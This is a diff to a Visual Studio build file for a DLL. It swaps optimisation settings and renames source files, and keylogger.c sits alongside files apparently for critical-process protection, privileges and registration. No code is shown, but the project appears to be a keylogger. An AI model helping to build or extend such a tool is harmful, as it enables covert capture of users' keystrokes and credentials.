@@ -36,7 +36,6 @@
     <ConfigurationType>DynamicLibrary</ConfigurationType>
     <UseDebugLibraries>false</UseDebugLibraries>
     <PlatformToolset>v143</PlatformToolset>
-    <WholeProgramOptimization>true</WholeProgramOptimization>
     <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
@@ -49,7 +48,6 @@
     <ConfigurationType>DynamicLibrary</ConfigurationType>
     <UseDebugLibraries>false</UseDebugLibraries>
     <PlatformToolset>v143</PlatformToolset>
-    <WholeProgramOptimization>true</WholeProgramOptimization>
     <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
@@ -155,13 +153,17 @@
   <ItemGroup>
     <ClCompile Include="keylogger.c" />
     <ClCompile Include="main.c" />
-    <ClCompile Include="power.c" />
-    <ClCompile Include="protect.c" />
+    <ClCompile Include="native_critical.c" />
+    <ClCompile Include="native_power.c" />
+    <ClCompile Include="privilege.c" />
+    <ClCompile Include="register_native.c" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="keylogger.h" />
-    <ClInclude Include="protect.h" />
-    <ClInclude Include="power.h" />
+    <ClInclude Include="native_critical.h" />
+    <ClInclude Include="privilege.h" />
+    <ClInclude Include="native_power.h" />
+    <ClInclude Include="register_native.h" />
   </ItemGroup>
   <ItemGroup>
     <ProjectReference Include="..\KHOPAN Library\KHOPAN Library.vcxproj">
